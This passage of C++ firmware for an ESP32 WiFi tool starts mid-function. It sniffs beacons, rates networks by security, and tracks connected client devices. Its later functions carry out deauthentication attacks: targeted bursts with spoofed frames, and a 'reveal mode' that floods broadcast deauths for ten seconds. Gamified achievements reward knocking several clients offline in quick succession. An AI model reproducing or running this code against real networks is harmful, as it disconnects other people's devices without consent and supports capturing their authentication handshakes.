                if (!pendingReveal) {
                    strncpy(pendingRevealSSID, ssid, 32);
                    pendingRevealSSID[32] = 0;
                    pendingReveal = true;
                }
            }
            // Also update if we had no SSID before
            else if (hasSSID && strlen(net.ssid) == 0) {
                strncpy(net.ssid, ssid, 32);
                net.ssid[32] = 0;
            }
            return;
        }
    }
    
    // Add new network (limit to prevent OOM)
    if (networks.size() >= MAX_SPECTRUM_NETWORKS) return;
    
    SpectrumNetwork net = {};
    memcpy(net.bssid, bssid, 6);
    if (hasSSID && ssid != nullptr) {
        strncpy(net.ssid, ssid, 32);
        net.ssid[32] = 0;
        net.isHidden = false;
    } else {
        // Empty SSID = hidden network
        net.isHidden = true;
        net.ssid[0] = 0; // Ensure empty string
    }
    net.channel = channel;
    net.rssi = rssi;
    net.lastSeen = millis();
    net.authmode = authmode;
    net.hasPMF = hasPMF;
    net.wasRevealed = false;
    net.displayFreqMHz = channelToFreq(channel);  // Initialize smoothed position
    net.clientCount = 0; // Initialize client count
    
    // Initialize client array to zero
    memset(net.clients, 0, sizeof(net.clients));
    
    // Defer push_back to main loop (ESP32 dual-core race: callback can run concurrent with update())
    // If pendingNetworkAdd already set, we lose one add - acceptable tradeoff for safety
    if (!pendingNetworkAdd.load()) {
        pendingNetwork = net;
        pendingNetworkAdd.store(true);
        // Defer XP to main loop (onBeacon runs in WiFi callback - can't call Display::showLevelUp)
        if (pendingNetworkXP < 255) pendingNetworkXP++;
    }
}

void SpectrumMode::getSelectedInfo(char* out, size_t len) {
    if (!out || len == 0) return;
    // [P8] Client monitoring mode - show client count and channel (SSID in header)
    if (monitoringNetwork) {
        if (renderMonitor.valid) {
            // SSID already shown in header - no duplication needed
            snprintf(out, len, "MON C:%02d CH:%02d", renderMonitor.clientCount, renderMonitor.channel);
            return;
        }
        snprintf(out, len, "MONITORING...");
        return;
    }
    
    if (renderSelected.valid) {
        // Bottom bar: ~33 chars available (240px - margins - uptime)
        // Fixed part: " -XXdB CH:XX YYYY" = ~16 chars worst case
        // SSID gets max 15 chars + ".." if truncated
        const size_t MAX_SSID_DISPLAY = 15;
        
        char ssidBuf[32];
        if (renderSelected.ssid[0]) {
            if (renderSelected.wasRevealed) {
                snprintf(ssidBuf, sizeof(ssidBuf), "*%s", renderSelected.ssid);
            } else {
                strncpy(ssidBuf, renderSelected.ssid, sizeof(ssidBuf) - 1);
                ssidBuf[sizeof(ssidBuf) - 1] = '\0';
            }
        } else {
            strncpy(ssidBuf, "[HIDDEN]", sizeof(ssidBuf) - 1);
            ssidBuf[sizeof(ssidBuf) - 1] = '\0';
        }
        for (size_t i = 0; ssidBuf[i]; i++) {
            ssidBuf[i] = (char)toupper((unsigned char)ssidBuf[i]);
        }
        size_t ssidLen = strlen(ssidBuf);
        if (ssidLen > MAX_SSID_DISPLAY) {
            if (MAX_SSID_DISPLAY >= 2) {
                ssidBuf[MAX_SSID_DISPLAY] = '\0';
                ssidBuf[MAX_SSID_DISPLAY - 2] = '.';
                ssidBuf[MAX_SSID_DISPLAY - 1] = '.';
            } else if (MAX_SSID_DISPLAY > 0) {
                ssidBuf[MAX_SSID_DISPLAY] = '\0';
            }
        }
        
        snprintf(out, len, "%s %ddB CH:%02d %s",
                 ssidBuf,
                 renderSelected.rssi,
                 renderSelected.channel,
                 authModeToShortString(renderSelected.authmode));
        return;
    }
    if (renderCount == 0) {
        snprintf(out, len, "SCANNING...");
        return;
    }
    snprintf(out, len, "PRESS ENTER TO SELECT");
}

// Packet callback - extract beacon info for visualization
void SpectrumMode::promiscuousCallback(const wifi_promiscuous_pkt_t* pkt, wifi_promiscuous_pkt_type_t type) {
    if (!running) return;
    if (busy) return;  // [P1] Main thread is iterating
    
    // Count all packets for PPS display in dial mode
    ppsCounter.fetch_add(1, std::memory_order_relaxed);
    
    if (!pkt || !pkt->payload) return;
    
    const uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t rxChannel = pkt->rx_ctrl.channel;
    if (rxChannel < 1 || rxChannel > 13) rxChannel = currentChannel;
    
    updateChannelStats(rxChannel, rssi);
    
    // Handle data frames when monitoring
    if (type == WIFI_PKT_DATA && monitoringNetwork) {
        processDataFrame(payload, len, rssi);
        return;
    }
    
    if (type != WIFI_PKT_MGMT) return;
    
    if (len < 36) return;
    
    // Check frame type - beacon (0x80) or probe response (0x50)
    uint8_t frameType = payload[0];
    if (frameType != 0x80 && frameType != 0x50) return;
    
    bool isProbeResponse = (frameType == 0x50);
    
    // BSSID is at offset 16
    const uint8_t* bssid = payload + 16;
    
    // Parse SSID and DS channel from tagged parameters (starts at offset 36)
    char ssid[33] = {0};
    bool ssidFound = false;
    uint8_t dsChannel = 0;
    uint16_t offset = 36;
    
    while (offset + 2 < len) {
        if (offset + 2 >= len) break; // Additional bounds check
        uint8_t tagNum = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tagNum == 0 && tagLen <= 32) {  // SSID tag
            if (offset + 2 + tagLen >= len) break; // Bounds check before memcpy
            memcpy(ssid, payload + offset + 2, tagLen);
            ssid[tagLen] = 0;
            ssidFound = true;
        } else if (tagNum == 3 && tagLen == 1) {  // DS Parameter Set (channel)
            dsChannel = payload[offset + 2];
        }
        
        if (ssidFound && dsChannel >= 1 && dsChannel <= 13) break;
        offset += 2 + tagLen;
    }
    
    bool channelTrusted = (dsChannel >= 1 && dsChannel <= 13);
    uint8_t channel = channelTrusted ? dsChannel : rxChannel;
    
    // Validate channel range (after DS channel override)
    if (channel < 1 || channel > 13) return;
    
    // Parse auth mode from RSN (0x30) and WPA (0xDD) IEs
    wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;  // Default to open
    bool hasRSN = false;
    offset = 36;
    while (offset + 2 < len) {
        if (offset + 2 >= len) break; // Additional bounds check
        uint8_t tagNum = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tagNum == 0x30 && tagLen >= 2) {  // RSN IE = WPA2/WPA3
            hasRSN = true;
            authmode = WIFI_AUTH_WPA2_PSK;
        } else if (tagNum == 0xDD && tagLen >= 8) {  // Vendor specific
            // Check for WPA1 OUI: 00:50:F2:01
            if (offset + 5 < len &&  // Ensure we don't read past buffer
                payload[offset + 2] == 0x00 && payload[offset + 3] == 0x50 &&
                payload[offset + 4] == 0xF2 && payload[offset + 5] == 0x01) {
                // WPA1 - only set if not already WPA2
                if (!hasRSN) {
                    authmode = WIFI_AUTH_WPA_PSK;
                } else {
                    authmode = WIFI_AUTH_WPA_WPA2_PSK;
                }
            }
        }
        
        offset += 2 + tagLen;
    }
    
    // Detect PMF - need both MFPC and MFPR to distinguish WPA3 from WPA2/WPA3 mixed
    bool hasPMF = false;
    bool pmfCapable = false;
    if (hasRSN && authmode == WIFI_AUTH_WPA2_PSK) {
        detectPMFBits(payload, len, pmfCapable, hasPMF);
        if (hasPMF) {
            authmode = WIFI_AUTH_WPA3_PSK;         // MFPR=1: pure WPA3-SAE
        } else if (pmfCapable) {
            authmode = WIFI_AUTH_WPA2_WPA3_PSK;    // MFPC=1 only: transitional
        }
    }
    
    // Update spectrum data
    onBeacon(bssid, channel, channelTrusted, rssi, ssid, authmode, hasPMF, isProbeResponse);
}

// Check if auth mode is considered vulnerable (OPEN, WEP, WPA1)
bool SpectrumMode::isVulnerable(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN:
        case WIFI_AUTH_WEP:
        case WIFI_AUTH_WPA_PSK:
            return true;
        default:
            return false;
    }
}

// Check if network passes current filter
bool SpectrumMode::matchesFilter(const SpectrumNetwork& net) {
    switch (filter) {
        case SpectrumFilter::VULN:
            return isVulnerable(net.authmode);
        case SpectrumFilter::SOFT:
            return !net.hasPMF;
        case SpectrumFilter::HIDDEN:
            return net.isHidden;
        case SpectrumFilter::ALL:
        default:
            return true;
    }
}

bool SpectrumMode::matchesFilterRender(const SpectrumRenderNet& net) {
    // 5GHz scan output doesn't expose PMF (SOFT) reliably; don't hide networks.
    if (viewBand == SpectrumBand::BAND_5 && filter == SpectrumFilter::SOFT) {
        return true;
    }
    switch (filter) {
        case SpectrumFilter::VULN:
            return isVulnerable(net.authmode);
        case SpectrumFilter::SOFT:
            return !net.hasPMF;
        case SpectrumFilter::HIDDEN:
            return net.isHidden;
        case SpectrumFilter::ALL:
        default:
            return true;
    }
}

// Convert auth mode to short display string
const char* SpectrumMode::authModeToShortString(wifi_auth_mode_t mode) {
    switch (mode) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
        case WIFI_AUTH_WAPI_PSK: return "WAPI";
        default: return "?";
    }
}

// Extract both PMF bits from RSN IE - MFPC (capable) and MFPR (required)
// MFPC=1,MFPR=0 = WPA2/WPA3 transitional. MFPR=1 = pure WPA3, deauth immune.
void SpectrumMode::detectPMFBits(const uint8_t* payload, uint16_t len, bool& mfpc, bool& mfpr) {
    mfpc = false;
    mfpr = false;
    uint16_t offset = 36;

    while (offset + 2 < len) {
        uint8_t tag = payload[offset];
        uint8_t tagLen = payload[offset + 1];

        if (offset + 2 + tagLen > len) break;

        if (tag == 0x30 && tagLen >= 8) {  // RSN IE
            uint16_t rsnOffset = offset + 2;
            uint16_t rsnEnd = rsnOffset + tagLen;

            rsnOffset += 6;  // Skip version(2) + group cipher(4)
            if (rsnOffset + 2 > rsnEnd) break;

            uint16_t pairwiseCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            { uint32_t skip = 2u + (uint32_t)pairwiseCount * 4u;
              if (skip > (uint32_t)(rsnEnd - rsnOffset)) break;
              rsnOffset += (uint16_t)skip; }
            if (rsnOffset + 2 > rsnEnd) break;

            uint16_t akmCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            { uint32_t skip = 2u + (uint32_t)akmCount * 4u;
              if (skip > (uint32_t)(rsnEnd - rsnOffset)) break;
              rsnOffset += (uint16_t)skip; }
            if (rsnOffset + 2 > rsnEnd) break;

            // RSN Capabilities - IEEE 802.11-2016 Table 9-133
            uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            mfpc = (rsnCaps >> 6) & 0x01;  // Bit 6: MFPC
            mfpr = (rsnCaps >> 7) & 0x01;  // Bit 7: MFPR
            return;
        }

        offset += 2 + tagLen;
    }
}

// Detect if PMF is required (MFPR=1) - deauth won't work against these
bool SpectrumMode::detectPMF(const uint8_t* payload, uint16_t len) {
    bool mfpc, mfpr;
    detectPMFBits(payload, len, mfpc, mfpr);
    return mfpr;
}

// Process data frame to extract client MAC
void SpectrumMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (!payload || len < 24) return;  // Too short for valid data frame or null payload
    
    // Frame Control is 2 bytes - ToDS/FromDS are in byte 1, not byte 0
    // Byte 0: Protocol(2) + Type(2) + Subtype(4)
    // Byte 1: ToDS(1) + FromDS(1) + MoreFrag + Retry + PwrMgmt + MoreData + Protected + Order
    uint8_t flags = payload[1];
    uint8_t toDS = (flags & 0x01);
    uint8_t fromDS = (flags & 0x02) >> 1;
    
    uint8_t bssid[6];
    uint8_t clientMac[6];
    
    if (toDS && !fromDS) {
        // Client -> AP: addr1=BSSID, addr2=client
        if (len < 16) return; // Check if payload is long enough for addr2
        memcpy(bssid, payload + 4, 6);
        memcpy(clientMac, payload + 10, 6);
    } else if (!toDS && fromDS) {
        // AP -> Client: addr1=client, addr2=BSSID
        if (len < 16) return; // Check if payload is long enough for addr2
        memcpy(clientMac, payload + 4, 6);
        memcpy(bssid, payload + 10, 6);
    } else {
        return;  // WDS or IBSS, ignore
    }
    
    // [P2] Verify BSSID matches monitored network
    if (!macEqual(bssid, monitoredBSSID)) return;
    
    // Skip broadcast/multicast clients
    if (clientMac[0] & 0x01) return;
    
    trackClient(bssid, clientMac, rssi);
}

// Track client connected to monitored network
void SpectrumMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
    // Skip if main thread is busy (race prevention)
    if (busy || !bssid || !clientMac) return;
    
    // Bounds check [P3]
    if (monitoredNetworkIndex < 0 || monitoredNetworkIndex >= (int)networks.size()) {
        // Don't call exitClientMonitor from callback - just skip
        return;
    }
    
    SpectrumNetwork& net = networks[monitoredNetworkIndex];
    
    // Double-check BSSID still matches [P2]
    if (!macEqual(net.bssid, monitoredBSSID)) {
        // Don't call exitClientMonitor from callback - just skip
        return;
    }
    
    uint32_t now = millis();
    
    // Check if client already tracked
    for (int i = 0; i < net.clientCount; i++) {
        if (macEqual(net.clients[i].mac, clientMac)) {
            net.clients[i].rssi = rssi;
            net.clients[i].lastSeen = now;
            return;  // Updated existing
        }
    }
    
    // Add new client if room
    if (net.clientCount < MAX_SPECTRUM_CLIENTS) {
        SpectrumClient& newClient = net.clients[net.clientCount];
        memcpy(newClient.mac, clientMac, 6);
        newClient.rssi = rssi;
        newClient.lastSeen = now;
        newClient.vendor = OUI::getVendor(clientMac);  // Cache once
        net.clientCount++;
        
        // Request beep for first few clients (avoid spamming)
        if (clientsDiscoveredThisSession < CLIENT_BEEP_LIMIT) {
            clientsDiscoveredThisSession++;
            pendingClientBeep = true;
        }
        
        // Defer logging — Serial.printf unsafe in WiFi callback context
        pendingClientBeep = true;
    }
}

// Enter client monitoring mode for selected network [P5]
void SpectrumMode::enterClientMonitor() {
    busy = true;  // [P5] Block callback FIRST
    
    // Bounds check [P3]
    if (selectedIndex < 0 || selectedIndex >= (int)networks.size()) {
        busy = false;
        return;
    }
    
    SpectrumNetwork& net = networks[selectedIndex];
    
    // Store BSSID separately [P2]
    memcpy(monitoredBSSID, net.bssid, 6);
    monitoredNetworkIndex = selectedIndex;
    monitoredChannel = net.channel;
    
    // Clear any old client data [P6]
    net.clientCount = 0;
    
    // Reset UI state
    clientScrollOffset = 0;
    selectedClientIndex = 0;
    lastClientPrune = millis();
    clientsDiscoveredThisSession = 0;  // Reset beep counter
    pendingClientBeep = false;         // Clear any pending beep
    
    // Reset achievement tracking (v0.1.6)
    clientMonitorEntryTime = millis();
    deauthsThisMonitor = 0;
    firstDeauthTime = 0;
    
    // Lock channel
    NetworkRecon::lockChannel(monitoredChannel);
    currentChannel = monitoredChannel;
    
    // Short beep for channel lock - non-blocking
    SFX::play(SFX::CHANNEL_LOCK);
    
    Serial.printf("[SPECTRUM] Monitoring %s on CH%d\n", 
        net.ssid[0] ? net.ssid : "<hidden>", monitoredChannel);
    
    // NOW enable monitoring (after all state is ready) [P5]
    monitoringNetwork = true;
    
    busy = false;
}

// Exit client monitoring mode [P4] [P5]
void SpectrumMode::exitClientMonitor() {
    busy = true;  // [P5] Block callback FIRST
    
    monitoringNetwork = false;  // [P4] Disable monitoring immediately
    
    // Clear client data to free memory [P6]
    if (monitoredNetworkIndex >= 0 && 
        monitoredNetworkIndex < (int)networks.size()) {
        networks[monitoredNetworkIndex].clientCount = 0;
    }
    
    // Reset indices
    monitoredNetworkIndex = -1;
    memset(monitoredBSSID, 0, 6);
    
    // Reset popup state
    clientDetailActive = false;
    
    Serial.println("[SPECTRUM] Exited client monitor");

    // Restore channel control: dial mode keeps lock, otherwise release.
    if (dialMode) {
        NetworkRecon::lockChannel(dialChannel);
        currentChannel = dialChannel;
    } else if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    
    busy = false;
}

// Prune stale clients [P1] [P3] [P10]
void SpectrumMode::pruneStaleClients() {
    busy = true;  // [P1] Block callback
    
    // Bounds check [P3]
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) {
        busy = false;
        return;
    }
    
    SpectrumNetwork& net = networks[monitoredNetworkIndex];
    uint32_t now = millis();
    
    // [P10] Iterate BACKWARDS to handle removal safely
    for (int i = net.clientCount - 1; i >= 0; i--) {
        if ((now - net.clients[i].lastSeen) > CLIENT_STALE_TIMEOUT_MS) {
            // Remove this client by shifting array
            for (int j = i; j < net.clientCount - 1; j++) {
                net.clients[j] = net.clients[j + 1];
            }
            net.clientCount--;
        }
    }
    
    // [P3] Fix selectedClientIndex if now out of bounds
    if (net.clientCount == 0) {
        selectedClientIndex = 0;
        clientScrollOffset = 0;
    } else if (selectedClientIndex >= net.clientCount) {
        selectedClientIndex = net.clientCount - 1;
    }
    
    // Fix scroll offset if needed
    if (clientScrollOffset > 0 && 
        clientScrollOffset >= net.clientCount) {
        int maxOffset = net.clientCount - VISIBLE_CLIENTS;
        clientScrollOffset = maxOffset > 0 ? maxOffset : 0;
    }
    
    busy = false;
}

// Get monitored network SSID [P3] [P15]
const char* SpectrumMode::getMonitoredSSID() {
    static char truncated[12];
    if (!monitoringNetwork) return "";
    if (monitoredNetworkIndex < 0 ||
        monitoredNetworkIndex >= (int)networks.size()) return "";

    const char* ssid = networks[monitoredNetworkIndex].ssid;
    if (ssid[0] == 0) return "<HIDDEN>";  // [P15]

    // Truncate for bottom bar [P9]
    strncpy(truncated, ssid, 11);
    truncated[11] = '\0';
    return truncated;
}

// Get client count for monitored network [P3]
int SpectrumMode::getClientCount() {
    if (!monitoringNetwork) return 0;
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) return 0;
    return networks[monitoredNetworkIndex].clientCount;
}

// Show client detail popup [P3] [P9]
void SpectrumMode::deauthClient(int idx) {
    // Block callback during deauth sequence (has delays)
    busy = true;
    
    // Bounds check [P3]
    if (monitoredNetworkIndex < 0 || 
        monitoredNetworkIndex >= (int)networks.size()) {
        busy = false;
        return;
    }
    if (idx < 0 || idx >= networks[monitoredNetworkIndex].clientCount) {
        busy = false;
        return;
    }
    
    const SpectrumNetwork& net = networks[monitoredNetworkIndex];
    const SpectrumClient& client = net.clients[idx];
    
    // Send deauth burst (5 frames with jitter)
    int sent = 0;
    for (int i = 0; i < 5; i++) {
        // Forward: AP -> Client
        if (WSLBypasser::sendDeauthFrame(net.bssid, net.channel, client.mac, 7)) {
            sent++;
        }
        delay(random(1, 6));  // 1-5ms jitter
        
        // Reverse: Client -> AP (spoofed)
        WSLBypasser::sendDeauthFrame(client.mac, net.channel, net.bssid, 8);
        delay(random(1, 6));
    }
    
    // Feedback beep (low thump) - non-blocking
    SFX::play(SFX::DEAUTH);
    
    // Short toast with client MAC suffix
    char msg[24];
    snprintf(msg, sizeof(msg), "DEAUTH %02X:%02X x%d",
        client.mac[4], client.mac[5], sent);
    Display::showToast(msg);
    delay(300);  // Brief feedback
    
    // === ACHIEVEMENT CHECKS (v0.1.6) ===
    uint32_t now = millis();
    
    // DEAD_EYE: Deauth within 2 seconds of entering monitor
    if (clientMonitorEntryTime > 0 && (now - clientMonitorEntryTime) < 2000) {
        if (!XP::hasAchievement(ACH_DEAD_EYE)) {
            XP::unlockAchievement(ACH_DEAD_EYE);
        }
    }
    
    // HIGH_NOON: Deauth during noon hour (12:00-12:59)
    time_t nowTime = time(nullptr);
    if (nowTime > 1700000000) {  // Valid time (after 2023)
        struct tm* timeinfo = localtime(&nowTime);
        if (timeinfo && timeinfo->tm_hour == 12) {
            if (!XP::hasAchievement(ACH_HIGH_NOON)) {
                XP::unlockAchievement(ACH_HIGH_NOON);
            }
        }
    }
    
    // QUICK_DRAW: Deauth 5 clients in under 30 seconds
    deauthsThisMonitor++;
    if (deauthsThisMonitor == 1) {
        firstDeauthTime = now;  // Start the timer on first deauth
    }
    if (deauthsThisMonitor >= 5 && (now - firstDeauthTime) < 30000) {
        if (!XP::hasAchievement(ACH_QUICK_DRAW)) {
            XP::unlockAchievement(ACH_QUICK_DRAW);
        }
    }
    
    busy = false;
}

// Enter reveal mode - broadcast deauth to discover clients
void SpectrumMode::enterRevealMode() {
    if (revealingClients) return;
    
    // Check PMF - warn if network is protected
    if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
        if (networks[monitoredNetworkIndex].hasPMF) {
            Display::showToast("PMF PROTECTED");
            return;
        }
    }
    
    revealingClients = true;
    revealStartTime = millis();
    lastRevealBurst = 0;
    
    // Sound feedback - non-blocking
    SFX::play(SFX::REVEAL_START);
}

// Exit reveal mode
void SpectrumMode::exitRevealMode() {
    if (!revealingClients) return;
    
    revealingClients = false;
    
    // Report how many clients found
    int clientCount = 0;
    if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
        clientCount = networks[monitoredNetworkIndex].clientCount;
    }
    
    char msg[24];
    snprintf(msg, sizeof(msg), "FOUND %d CLIENTS", clientCount);
    Display::showToast(msg);
}

// Update reveal mode - send periodic broadcast deauths
void SpectrumMode::updateRevealMode() {
    if (!revealingClients) return;
    
    uint32_t now = millis();
    
    // Auto-exit after 10 seconds
    if (now - revealStartTime > 10000) {
        exitRevealMode();
        return;
    }
    
    // Send broadcast deauth every 500ms
    if (now - lastRevealBurst >= 500) {
        lastRevealBurst = now;
        
        if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
            const auto& net = networks[monitoredNetworkIndex];
            const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            
            // Send 3 broadcast deauths
            for (int i = 0; i < 3; i++) {
                WSLBypasser::sendDeauthFrame(net.bssid, net.channel, broadcast, 7);
                delay(5);
            }
            
            // Pulse beep during reveal - disabled to avoid audio spam
            // SFX handles reveal start sound
        }
    }
}
